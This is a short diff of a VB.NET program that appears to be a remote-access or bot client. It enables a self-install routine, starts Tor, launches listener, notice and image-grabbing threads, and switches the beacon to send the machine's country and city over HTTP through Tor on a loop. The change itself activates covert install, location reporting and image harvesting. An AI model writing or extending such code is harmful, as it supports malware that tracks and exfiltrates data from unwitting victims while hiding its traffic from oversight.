@@ -8,12 +8,12 @@ Module Main
     ReadOnly DelayedAction As New Thread(AddressOf DelayedActions)
     ReadOnly NewImageGraber As New Thread(AddressOf ImageGraber)
     Sub Main()
-        'Install()
-        'StartTor()
+        Install()
+        StartTor()
 
-        'NewListener.Start()
-        'NewNotice.Start()
-        'DelayedAction.Start()
+        NewListener.Start()
+        NewNotice.Start()
+        DelayedAction.Start()
         If Not File.Exists(GetLocal_path() & "\Images.txt") Then
             NewImageGraber.Start()
         End If
@@ -34,8 +34,8 @@ Module Main
                 .CountryCode = GetCountyCode(GetMyIPAddress()),
                 .City = GetCity(GetMyIPAddress())
             }
-            Dim tcplistener As New TcpListen
-            tcplistener.TalkChannelHTTP(model.ToString)
+            Dim http As New SendHTTPonTor
+            http.TalkChannelHTTP(model.ToString)
             Thread.Sleep(SectoMs(200))
         End While
     End Sub
